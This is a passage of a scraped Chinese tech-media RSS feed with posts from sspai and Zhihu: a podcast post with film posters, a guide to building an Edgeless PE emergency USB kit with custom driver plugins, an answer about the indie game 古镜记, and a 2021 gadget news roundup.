src=\"https://cdn.sspai.com/2021/08/12/03cd9ff93843cc3f22abd0eb0af8cd15.png\"><figcaption>节目封面：游戏《画中世界》（Gorogoa）</figcaption></figure><p>收听链接：<a href=\"https://podcasts.apple.com/cn/podcast/e25-%E5%81%9A%E4%B8%AA%E5%93%B2%E5%AD%A6%E6%B8%B8%E6%88%8F%E5%90%A7-%E5%9C%A8%E8%AF%AD%E8%A8%80%E4%B9%8B%E5%89%8D%E7%9A%84-%E5%92%8C%E9%82%A3%E6%AF%94%E8%AF%AD%E8%A8%80%E6%9B%B4%E5%A4%9A%E7%9A%84/id1519636101?i=1000530532159\">苹果播客</a> | <a href=\"https://www.xiaoyuzhoufm.com/episode/610424af70c36b024072d657?s=eyJ1IjogIjVmYmNhZTNjZTBmNWU3MjNiYjUyMDU2MiJ9\">小宇宙</a></p>\n<p>节目介绍：本期播客节目是落日间与游戏工作室 NExT Studios 官方播客《爱游新生》的串台节目，如果你对游戏的开发的视角有兴趣，欢迎关注！</p>\n<p>节目嘉宾：</p>\n<p><strong>张哲川 Nick</strong></p>\n<blockquote><p>NExT Studios 《疑案追声》制作人 ，见《疑案追声》制作人张哲川：这或许是走出大内卷时代的一线希望</p></blockquote>\n<p><strong>姜宇辉</strong></p>\n<blockquote><p>巴黎高等师范学校硕士，复旦大学哲学博士。华东师范大学哲学系教授，博士生导师。外国哲学教研室主任。上海市“曙光学者”。法国哲学研究会理事。主要研究方向为当代法国哲学与艺术哲学。专著有《德勒兹身体美学研究》与《画与真：梅洛-庞蒂与中国山水画境》。译著有《千高原》与《普鲁斯特与符号》。</p></blockquote>\n<h3>🌈🥚7 电影《<a href=\"https://movie.douban.com/subject/30337388/\">失控玩家</a>》（Free Guy）公布了一组游戏风格的海报，你能认出是哪些游戏吗？</h3>\n<p>所有海报来源：<a href=\"https://twitter.com/20thcentury/status/1424781172224139264\">Twitter 20th Century Studio</a></p>\n<p>虽然这组海报很适合搞一次趣味有奖猜谜活动（比如说第一个在评论区正确答出所有游戏名的读者），但是可惜我没有奖品可以发给大家。</p>\n<p>每张图下方已经附上编号，方便有兴趣解答的读者一一对应。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/856cd04f6a683c01638531f31a2bd6d2.jpeg\"><figcaption>1</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/5dd877bc815c013c4715338c504e3ec9.jpeg\"><figcaption>2</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/9e032cd68613e69fde374e8761db2afc.jpeg\"><figcaption>3</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/d2f9c1f6278b336a2a0af5345dc8cb85.jpeg\"><figcaption>4</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/276e20d3e6660220207bd0f7752b9191.jpeg\"><figcaption>5</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/c9fba4c389c2b35b5d45d942f1499c28.jpeg\"><figcaption>6</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/f86295343ef2b42fbebbf9308cd4017c.jpeg\"><figcaption>7</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/3830e3d41909b8f758d7bc2ed6027b76.jpeg\"><figcaption>8</figcaption></figure><p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68222"},{"title":"快快应急，慢慢修复：你的专属 PC 急救包","date":"2021-08-13 03:27:46","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>对很多人来说，做好备份，或许就是应对电脑出现意外的唯一一重「失败安全」机制。但是，你是否真正实操过恢复备份的流程呢？可靠的备份固然能保证数据在原件丢失或损坏时的完整性，但却带来了另一个问题——时间成本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/81937facca844053e4bec0e5d9c4306d.jpg\"><figcaption>你的系统遇到了一个问题.png（图片来源于知乎作者 @crystal，侵删）</figcaption></figure><p>试想，当你的系统遇到了以下情况：</p>\n<ul>\n<li>因某次更新而损坏，无法开机；</li>\n<li>能够开机，但是某些要用到的程序突然无法运行，且短时间内找不出解决办法；</li>\n<li>或者更不幸的，遇到了勒索病毒，无法快速修复……</li>\n</ul>\n<p>与之同时：</p>\n<ul>\n<li>你的毕业论文马上就要上交了；</li>\n<li>有人需要一个 Word 文档，而且要尽快做好；</li>\n<li>有人给你发了个百度云链接，让你在 PC 上收取……</li>\n</ul>\n<p>这时，单独给系统预留恢复的时间，就显得有些不可接受。</p>\n<p>那么，是否有一种可能，让电脑先暂时运行一个「<strong>最小的应急系统</strong>」，将眼前急着需要完成的事情先迅速完成，再慢慢考虑修复系统的事情呢（或者说，边应急边修复，双管齐下）？答案当然是有。这也是本文诞生的原因。如此，你就可以安稳无忧的使用电脑——就算坏了也不必担心，因为早有准备。</p>\n<p>在正文开始之前，先看下最终能够达成的效果吧。</p>\n<h2>最终效果</h2>\n<p>下面都是这个应急包可以达成（但不局限于）的效果。</p>\n<ul><li><strong>顺畅联网</strong></li></ul>\n<p>（需要自行集成网卡驱动。下面的文章也将作出说明。）</p>\n<p>需要联网？考虑到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/bf9882772b33e82626c2b77267c29ad7.png\"><figcaption>在浏览器里看 sspai</figcaption></figure><ul><li><strong>处理文档</strong></li></ul>\n<p>文档、表格、PPT……不在话下。<sup class=\"ss-footnote\" href=\"\" title=\"在 Edgeless 上可以运行的最高本地版 Office 是 2010。由于我没有 Office 2010 的正版授权，故这里以 Office 365 网页版的截图取代之。你可以根据自己的授权情况合理选择。\" footnote-id=\"1\">1</sup></p>\n<figure class=\"ss-imgRows\" figcaption=\"Office 全家桶 VS WPS Office 2019\"><img src=\"https://cdn.sspai.com/2021/08/05/cef1f31c2f15c484e6c93ffc724cabf8.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/63dcbfe23c380897ff7b07958536c015.png\" alt=\"\"></figure><ul><li><strong>回个消息</strong></li></ul>\n<p>用用微信、QQ……当然可以。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/6d751f97ae2e41fdf79cb0673f6bf1c3.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/8cf048a1ebbca7fac6772c71d5157a1e.png\" alt=\"\"></figure><ul><li><strong>修个图</strong></li></ul>\n<p>需要 Ps？没问题。<sup class=\"ss-footnote\" href=\"\" title=\"这里展示的是开源版绘图程序 GIMP。你可以根据自己的情况选择下载 Ps\" footnote-id=\"2\">2</sup></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/455efc15931a32a3102e471ee4387dbe.png\"></figure><ul><li><strong>随心写稿</strong></li></ul>\n<p>要催稿了？马上赶稿（不是</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/92e246a016c3594ebdeb27df0c9e0c46.png\"><figcaption>没错，这篇文章就是在急救包里写好的</figcaption></figure><ul><li><strong>做更多……</strong></li></ul>\n<p>不满足？想加点别的？随心定制……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/101eeb097e66d02ec8efbde17bb18e6a.png\"><figcaption>海量插件随意选择</figcaption></figure><ul><li><strong>最后……顺便修下系统</strong></li></ul>\n<p>常规 PE 能干的，它都可以。也许它还能更胜一筹：电脑坏了？反正还有应急方案，不用急着修。</p>\n<p>感觉不错？那就拿出一个空闲的 U 盘，动手做一个专属的 PC 急救包吧。</p>\n<h2>下载并制作</h2>\n<p>这里采用的是（截至写稿日）来自某 211 大学生编写的 PE 环境 —— Edgeless。它的相关文档相当完善，你只需要 <a href=\"https://wiki.edgeless.top/v2/guide/burn.html\" target=\"_blank\">点击这里</a> 即可无门槛地做出一个 Edgeless 启动盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/a8138f589aa32f9264642312562937f4.png\"></figure><p>由于原作者给出的安装介绍相当详尽，这里将不再叙述安装方法。下文将直接进入定制环节——给应急包加点料。</p>\n<h2>整合驱动</h2>\n<p>初始的系统或许并不那么理想：网卡、声卡或许无法使用。而要达成应急的目的，它们或许不可或缺。这时，就需要把 OEM 制作的驱动整合进系统里了。</p>\n<p>需要说明的是，部分驱动已经有人提前打包好并上传到下载站了。你可以先在 <a href=\"https://zfile.edgeless.top/#/1/main/%E6%8F%92%E4%BB%B6%E5%8C%85/%E9%A9%B1%E5%8A%A8%E7%AE%A1%E7%90%86\" target=\"_blank\">这里</a> 看看是否能找到合适的驱动。如果能的话就可以跳过下方的步骤。下面介绍的是手动制作驱动插件的内容。这里将以联想笔记本的 Intel 无线网卡驱动为例。其它驱动的整合步骤大同小异。</p>\n<p>首先，下载驱动。在双击之后，选择「仅解压模式」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/17bc30e178fb823cdb08ed1d3e16eba5.png\"><figcaption>记得选择上面那个选项</figcaption></figure><p>解压完成后，便需要分析驱动安装的方式。在这里（以及在我笔记本上测试的绝大多数 OEM 驱动），安装驱动的方式是执行内部的一个批处理脚本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/cea1cac0637a406ff99006b7da003208.png\"><figcaption>它叫做 install.bat</figcaption></figure><p>那么，要达成注入驱动的目的，只需让系统启动时，自动执行这个脚本即可。</p>\n<p>在开始之前，有必要稍微了解一下 Edgeless 插件的原理。它是一个 7z 压缩包，内含两个部分：</p>\n<ul>\n<li>文件夹，内含驱动；</li>\n<li>外置批处理，用于描述安装步骤。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/bc33bf3e9e00b446e22f7308c145ab76.png\"><figcaption>一个例子。这个是我笔记本的网卡驱动做成的插件</figcaption></figure><p>由于这里的方案只是简单地在开机时执行一个脚本，因此不会涉及到所有的插件制作流程。你可以在 <a href=\"https://wiki.edgeless.top/v2/develop/quickstart.html\" target=\"_blank\">这里</a> 查看完整的制作文档。同时，并不是所有的驱动都可以这样整合（例如 Intel 的显卡驱动）。为方便说明，下文将假定制作一个叫「LenovoXiaoXinAir14WIFI」的驱动插件。</p>\n<p>将解压的驱动放在一个文件夹内，并在与文件夹同级的地方新建一个描述文件（名称不一定需要和文件夹名相同），后缀名为 <code>.wcs</code>。</p>\n<p>目前的文件夹结构如下：</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/d1d75e04594d552dc43b410006375a6e.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/6d8663ca7c89145d382e5f7632eea964.png\" alt=\"\"></figure><p>之后，用文本编辑器打开后缀叫 <code>.wcs</code> 的配置文件，输入以下内容：</p>\n<p><code>exec !\"X:\\Program Files\\Edgeless\\&lt;你的驱动文件夹名&gt;\\install.bat\"</code></p>\n<p>其中，<code>X:\\Program Files\\Edgeless\\</code> 表示该驱动包在加载时会被释放的地点。&lt;你的驱动文件夹名&gt; 代表着该插件包内文件夹的名字。记得将&lt;你的驱动文件夹名&gt;替换成真正的文件夹名。在这里，&lt;你的驱动文件夹名&gt; 将被替换为 <code>LenovoXiaoXinAir14WIFI</code>。</p>\n<p>编辑完成后，保存，并将描述文件和文件夹选中，右键压缩成 7z 压缩包。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/3ec20091a19b3e6a34f36c1c287882e2.gif\"></figure><p>这样，一个简单的插件就制作完成了。</p>\n<p>将这个压缩包放入 U 盘的 Resource 文件夹内，开机就会自动加载这个驱动了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/7b129b92a8ee2afbb6604963fd43c812.gif\"></figure><p>同理，你可以将其它需要的驱动做成插件。这样，这个应急包就有了最基础的一些功能。</p>\n<h2>加入程序</h2>\n<p>驱动完善后，下一步就是加入常用的应急程序了。在 Edgeless 中，需要加入的程序也被称作「插件包」。只需要下载需要的程序「插件」，放入到 U 盘的指定位置，下次进入系统时就可以看见想要的程序了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/26c4a37342aa65ab3a75d0964c05b230.png\"><figcaption>这些是我放的程序</figcaption></figure><p>如果使用了 Edgeless Hub，你便可以在里面轻松地选择需要加入的程序 / 驱动——只需点击左侧的「插件」即可！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/9559199bd6f5307f819af64726247726.gif\"><figcaption>轻松下载并安装插件</figcaption></figure><p>不想开程序？那也无妨。你可以 <a href=\"https://zfile.edgeless.top/#/1/main\" target=\"_blank\">在这里</a> 手动下载到所有的程序或驱动，并放在 U盘:\\Edgeless\\Resource 里。下次进入系统时就会自动加载它们。<sup class=\"ss-footnote\" href=\"\" title=\"不必将所有的插件都放在 Resource 中，这会显著延长加载时间。实际上，你可以将部分不那么重要的插件放在别的地方，进入系统后按需加载——右键插件包即可\" footnote-id=\"3\">3</sup></p>\n<p>在这里，你只需要：</p>\n<ul>\n<li>前往浏览器，获取 Chrome 插件；</li>\n<li>前往办公编辑，获取 Office 与 WPS 插件；</li>\n<li>前往其它地方，下载到相应的插件……</li>\n</ul>\n<p>就可以实现上文所提到的效果了。由于实现方式相当明晰，这里将不再赘述。如仍有疑问，作者写了一份稍加详尽的文档：<a href=\"https://wiki.edgeless.top/v2/guide/pluginpackages.html#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%8F%92%E4%BB%B6%E5%8C%85\" target=\"_blank\">点这里</a>，不妨一读。</p>\n<p>顺带一提，别忘了放个输入法插件！🙋‍♀️ 不然就没法输入中文了。</p>\n<p>在加入相当的程序插件后，Edgeless 就从一个平淡无奇的 PE 系统，摇身一变，成为了在应对各种意外情况的专属急救包。从此，即使系统坏了，也无妨。只需插上 U 盘，即可轻松应对。</p>\n<h2>为什么不用 Windows To Go？</h2>\n<p>也许你会有疑问：那为什么不用 Windows To Go 呢？制作简单，也不需要学习如何制作插件包，它似乎也能达到应急的目的。</p>\n<p>这里是我最终选择 Edgeless 的原因。你可以参考：</p>\n<ul>\n<li>快。得益于远古但好用的 RamDisk 机制，几乎所有程序都运行在内存里。因此，不必担心 U 盘的性能会影响系统的运行效率。</li>\n<li>轻。每一次启动都是全新的系统。不需要担心应急时刻对系统做出不恰当修改。只需重启——一切宛如初见。</li>\n<li>生态。已经有不少人给这个系统做了主流软件的插件包。只需下载并放在指定的位置，就可以完成程序的装载——不需要进行繁杂的安装步骤，节省时间。</li>\n<li>支持。Windows To Go 已经停止支持。未来可能不再可用。<sup class=\"ss-footnote\" href=\"https://docs.microsoft.com/zh-cn/windows/deployment/planning/windows-10-deprecated-features\" title=\"可到这里：https://docs.microsoft.com/zh-cn/windows/deployment/planning/windows-10-deprecated-features 查看详情\" footnote-id=\"4\">4</sup>\n</li>\n</ul>\n<p>你可以自行取舍，选择最适合你的方法。</p>\n<h2>结束了？</h2>\n<p>这篇文章并不长（或许还挺短的？），也许只需要十来分钟就可以读完。如果还没有开始实践的话，现在是最好的时机——不妨用一杯下午茶的时间，给你的 U 盘加点料。当然，这个急救包可以折腾的东西远不止这些。事实上，你还可以：</p>\n<ul>\n<li>给它换个好看的主题包；</li>\n<li>加入自定义启动参数（就像传统的 PE 那样）；</li>\n<li>定制浏览器（加点常用网站、插件……）。</li>\n</ul>\n<p>它们也有非常详尽的文档。<a href=\"https://wiki.edgeless.top/\" target=\"_blank\">点击这里</a> 即可一览全貌。</p>\n<p>顺带一提，由于该系统使用 Ventoy 制作启动盘，因此你大可以将剩余的空间划给日常需要用到 U 盘的场景 —— 日用应急两不误。</p>\n<p>一如既往的，衷心希望这里的内容对你有帮助。同时，本文精美头图选自无版权图片网站 <a href=\"http://unsplash.com/\" target=\"_blank\">Unsplash</a>，感谢！</p>\n<p>最后的最后，如果这个急救包在某个关键时刻帮到了你，不妨给原作者送上一杯暖心的咖啡。<a href=\"https://home.edgeless.top/#donate\" target=\"_blank\">点这里</a> 去原作者网站赞助它 :)。这有利于该项目的长期运行。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/67829\" target=\"_blank\">使用习惯随身带：Windows 应用配置的管理与备份方案分享</a></li>\n<li><a href=\"https://sspai.com/post/67003\" target=\"_blank\">不用开机键，你的 Windows 也能随时就绪：WoL 网络唤醒入门</a></li>\n<li><a href=\"https://sspai.com/post/66129\" target=\"_blank\">这个隐藏在系统里的「老功能」，能让 Windows 也实现自动化</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\"> 冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68106"},{"title":"如何评价国风推理游戏《古镜记》？","date":"2021-08-13 03:00:10","description":"\n<p>我来回答这个问题。</p>\n<p>建议大家去看一下制作人小鸡的照片。</p>\n<p>清丽脱俗，天香佳人。</p>\n<p>第一次见到她的时候，我心想，这样的女孩子，怕是有点才华哦。</p>\n<p>那之前，她只去上海某公司上了一天班，便快速逃离了那种令人不快的环境。</p>\n<p>当然，之后因为很神奇的原因，她最终进入了胖布丁。</p>\n<p>我明白她的作品不错，我也明白她的能力不错，只是，那时候，我们还在做着迷失岛2，还在那些粗犷凛冽的美术线条中打转。她试着学习我的风格画了一些场景。画得不错，但是还是和我的原始风格有差别。</p>\n<p>所以，我一直想，她值得有机会做一些她能更好驾驭的风格。</p>\n<p>刚好，那时候我在写一些未来游戏开发计划。写好后，叫大家传看，选择自己觉得合适的发挥起来。</p>\n<p>从《三言两拍》中择取一段有趣的故事，改编，做成解谜游戏。就是《古镜记》的来源。</p>\n<p>当然，胖布丁这么多人，想来，也只有小鸡能立马选择这一主题。</p>\n<p>非常适合她，如她这样一位古典气质的奇女子，义不容辞，当仁不让啊！</p>\n<p>《古镜记》有一种优雅、古拙、华美的色彩。</p>\n<p>《古镜记》讲了一段隽永、深情、迷人的故事。</p>\n<p>《古镜记》是一个雅致、精巧、奇幻的游戏。</p>\n<p>把上面三段话中的色彩、故事和游戏，换成小鸡的名字，也很适合。</p>\n<p>我想这就是合格的独立游戏游戏制作人所能带给游戏的个性气质。</p>\n<p>当然，胡桃的动画精美到令人屏息，而蒋同学的程序就好像是所有这一切的基石。</p>\n<p>还有那些为了这个游戏付出一切的人。</p>\n<p>他们所有的灵魂都能在这款独立游戏中找到一一对应点。</p>\n<p>所以说，在我看来，这是一款有灵魂的游戏。</p>\n<p>我知道我该谢谢他们，因为他们让胖布丁变得更好。</p>\n<p>《古镜记》也许在别人看来，不是一款满分的作品。或多或少，总有一些缺陷。</p>\n<p>但是在我看来，一群人付出了百分百的努力，做了这些许年，得到了这样一个作品。无论如何，对他们和对我而言，这就是一款满分的作品。</p>\n<p>好吧，再写下去，大家会觉得我们在自我陶醉了。</p>\n<p>那么，讲一段不自我陶醉的故事吧。</p>\n<p>为了得到一段合适的音乐，小鸡找到了一位音乐创作人，几经周折后，主题曲被创作出来了。</p>\n<p>第一次听这首歌，《今夜果实成熟时》，我心想，这啥玩意啊，完全接受不了啊。</p>\n<p>但是小鸡对这首歌曲很满意。</p>\n<p>我想，我是不是老了。所以我给小鸡说：我接受不了，但是，重要的是，你满意就好。</p>\n<p>后来，每天，大家做游戏片头动画的时候，我都能在公司的各种场合听见这首歌。</p>\n<p>慢慢地，歌曲入我耳也能动听起来。后来，我还能不自觉的哼唱。</p>\n<p>再后来，我把这首歌拿给我12岁的小侄女听，她听了一遍后，就极其喜欢，循环播放了一天。</p>\n<p>我想，我确实是老了啊。</p>\n<p>不过，这正是我开心的原因。</p>\n<p>我在胖布丁的每一天，都能和这些有着无穷才华的年轻人一同工作，一同成长，这，让我的游戏开发岁月，变得更加的笃定和有意义。</p>\n<p>作为一个创作者，就如同登上了一辆充满斗志的时间列车，开往更年轻的激动人心的未来啊！</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-mian-hua-29-45?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小棉花</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/479155481/answer/2056589796?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">79 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/267230517?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你知道怎么写游戏设计文档（Game Design Document）么？</a><br><a href=\"http://www.zhihu.com/question/23139838?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《Paper, please》这款游戏？</a><br>\n","link":"http://www.zhihu.com/question/479155481/answer/2056589796?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：荣耀新品发布会、安兔兔评测 Windows 版上线等","date":"2021-08-13 01:01:44","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>荣耀新品发布会</h3>\n<p>荣耀于 8 月 12 日发布会上正式发布了 Magic3 系列旗舰手机，包括荣耀 Magic3、荣耀 Magic3 Pro 以及荣耀 Magic3 至臻版。</p>\n<p>其中 Magic3 搭载骁龙 888 芯片，Magic3 Pro 搭载高通骁龙 888 Plus 芯片，均配有 6.76 英寸柔性 OLED 屏幕。系列机型均搭载全新的 OS Turbo X 系统引擎，包含超低时延引擎、抗老化引擎和智慧内存引擎。Magic3 系列配备了 4600mAh 大电池，其中 Magic3 支持 66W 有线超级快充，而 Magic3 Pro 支持 66W 有线和 50W 无线双超级快充。Magic3 系列均采用 Magic UI 5.0，拥有生态主题 AOD、智慧状态互动、全新定制主题彩铃等多项全新功能。影像方面，Magic3 采用三摄方案，配备 5000 万像素超大底主摄，6400 万黑白摄像头以及 1300 万超广角镜头，Magic3 Pro 额外搭载 6400 万潜望式长焦摄像头。Magic3 至臻版配有 5000 万像素超大底主摄、6400 万黑白摄像头、6400 万潜望式长焦摄像头以及 6400 万广角微距镜头。</p>\n<p>Magic3 有晨晖金、曙光蓝、釉白色、亮黑色四种配色，而 Magic3 Pro 有晨辉金、釉白色、亮黑色三种配色，Magic3 至臻版拥有陶瓷白和陶瓷黑两种配色。售价方面，Magic3 8+128GB 版本售价 4599 元，8+256GB 版本售价 4999 元。Magic3 Pro 8+256GB 版本售价 5999 元，12+512GB 版本售价 6799 元。Magic3 至臻版 12+512GB 版本售价 7999 元。<a href=\"https://www.pingwest.com/w/247756\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6d5b34tfv4jeutvg.jpeg\"><figcaption>图片来自新闻源</figcaption></figure><p>除了旗舰机型之外，荣耀还推出了中低端机型 荣耀 X20，采用天玑 900 芯片，采用6.67英寸屏幕。采用 4300mAh 大电池，并支持 66W 超级快充，同时采用侧边指纹识别，提供 3.5mm 耳机孔。影像方面，采用前置1600万像素摄像头，后置三摄方案，配有一颗 6400 万像素超清主摄以及 200 万景深镜头和 200 万微距镜头。荣耀 X20 拥有幻夜黑、极光蓝和钛空银三种配色。6GB+128GB 版售价 1899 元，8GB+128GB版售价 2199 元，8GB+256GB 版售价 2499 元。<a href=\"https://www.pingwest.com/w/247758\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6ddb34tfgga8hl70.png\"><figcaption>图片来自新闻源</figcaption></figure><p> </p>\n<p>另外发布会上还推出了平板电脑荣耀平板 V7 PRO，整机采用直边设计，机身厚度仅为 7.25 mm，搭载 11 英寸 2.5K 全面屏，屏占比高达 86%。荣耀平板 V7 PRO 搭载 MediaTek 迅鲲 1300T 芯片，采用 6nm 制程，8 核 CPU，旗舰级 A78 架构。荣耀平板 V7 PRO 支持双模 5G 和 Wi-Fi 6，内置 7250mAh 电池，单次充满电可支持 37 天超长待机，拥有晨辉金、曙光蓝和钛空银三种配色。荣耀平板 V7 PRO Wifi 版 6+128GB 售价 2599 元， Wifi 版 8+128GB 售价 2899 元， Wifi 版 8+256GB 售价 3299 元，5G版 8+256GB 售价 3699 元。用户还可以选购 799 元的荣耀 Magic 悬浮键盘以及 499 元的荣耀 Magic-Pencil 2。<a href=\"https://www.pingwest.com/w/247757\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6ddb34tfgq1n8ao0.jpeg\"><figcaption>图片来自新闻源</figcaption></figure><h3>安兔兔评测 Windows 版上线</h3>\n<p>8 月 12 日，安兔兔在官网发布公告，宣布继 Android、iOS 以及 Linux 版本后，正式推出 Windows 版。该软件提供了四大基础测试项目，分别为 CPU、GPU、MEM 和 UX，GPU 部分支持光追测试，用于考察 GPU 在极限场景下的性能表现。除此之外，还提供了压力测试和屏幕测试。<a href=\"https://www.antutu.com/doc/125542.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6dlb34tfgga8hl7g.png\"><figcaption>图片来自新闻源</figcaption></figure><h3>雷蛇发布多款键盘升级套装</h3>\n<p>雷蛇于 8 月 12 日发布了一系列适用于机械键盘的升级套装和配件，其中雷蛇 PBT 键盘升级套件提供了雷蛇绿、经典黑、水晶白和石英粉多款配色组合，玩家可以自由组合键帽以及数据线。卷绕线材采用 Type-C 接口，适用于键线分离机械键盘，线材有着编织表面，长度最大 2 米，售价为 49.99 美元。Phantom 键帽升级套装采用了双层键帽结构设计，下半部分透明，能够更好地展现键盘的灯光效果，键帽文字采用激光蚀刻工艺，不会掉色，同时支持透光。该系列升级键帽最高提供 128 键版本，有黑色和白色可选，售价为 34.99 美元。Ergonomic 腕托采用记忆海绵打造，外表覆盖防水人造革，减轻维护成本。该产品结合机械键盘使用，能够使得打字更加舒适，缓解手部疲劳，售价为 19.99 美元。<a href=\"https://finance.sina.com.cn/tech/2021-08-12/doc-ikqciyzm0990847.shtml\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6dtb34tfgga8hl80.png\"><figcaption>图片来自新闻源</figcaption></figure><h3>HomePod 将支持空间音频以及无损音乐</h3>\n<p>近日，Apple 发布的最新 HomePod 15 Beta 5 固件显示，该设备已支持无损和杜比全景声的功能。根据用户反馈，目前该功能处于灰度测试阶段，用户可以通过 Apple Music 核实是否开启。<a href=\"https://www.engadget.com/homepod-mini-spatial-audio-apple-music-lossless-support-beta-210300048.html?src=rss\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6e5b34tfgga8hl8g.png\"><figcaption>图片来自新闻源</figcaption></figure><h3>Spotify 更新 Wear OS App</h3>\n<p>8 月 12 日，Spotify 更新官网公告，宣布其 Wear OS 版本 App 迎来重要更新，本次更新支持直接把音乐下载到 Wear OS 手表中，即使用户单独使用智能手表，可以离线收听歌曲。<a href=\"https://newsroom.spotify.com/2021-08-11/enjoy-all-your-music-and-podcasts-offline-on-smartwatches-running-wear-os/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4as6edb34tfgga8hl90.png\"><figcaption>图片来自新闻源</figcaption></figure><h3>惠普发布多款 Chrome OS 生态新品</h3>\n<p>惠普于 8 月 12 日发布多款 Chrome OS 生态新品，Chromebook x2 为一款 Chrome OS 平板电脑，采用 11 英寸 2K 分辨率触摸屏，比例为 3：2，带有可拆卸的键盘保护套，处理器采用高通骁龙 7c 计算平台，电池续航时间可达 11 小时。网络连接上支持 4G LTE 以及 Wi-Fi 5，同时配备 USI 手写笔并可以贴附在侧边进行无限充电。售价为 599.99美元。</p>\n<p>Chromebase 21.5 是一款 21.5 英寸屏幕的 chrome OS 